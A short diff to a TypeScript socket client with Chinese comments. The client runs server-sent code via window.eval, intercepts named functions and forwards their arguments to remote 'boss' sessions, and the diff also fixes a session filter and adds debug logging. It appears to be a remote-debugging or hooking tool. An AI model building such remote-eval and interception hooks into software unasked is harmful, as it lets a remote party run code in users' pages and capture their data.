@@ -21,10 +21,10 @@ export function init(cfg: Config) {
   socket.emit('user:join')
 
   // 执行代码
-  socket.on('user:eval', (message: Message) => {
-    if (message.data) {
-      window.eval(message.data)
-    }
+  socket.on('user:eval', (message: Message<{ content: string }>) => {
+    console.log('xx => ', message)
+    const { content } = message.data
+    window.eval(content)
   })
 
   // 会话
@@ -33,12 +33,13 @@ export function init(cfg: Config) {
     bosss.push(message.data)
   })
   socket.on('user:session exit', (message: Message) => {
-    bosss = bosss.filter((boss) => boss.id === message.data.id)
+    bosss = bosss.filter((boss) => boss.id !== message.data.id)
   })
 
   // 劫持
   methodNames?.map((fn) => {
     hijack(fn, (fn, ...args) => {
+      console.log('bosss => ', bosss)
       if (bosss.length) {
         console.log('劫持代码')
         socket.emit('user:message', { fn, contents: args })
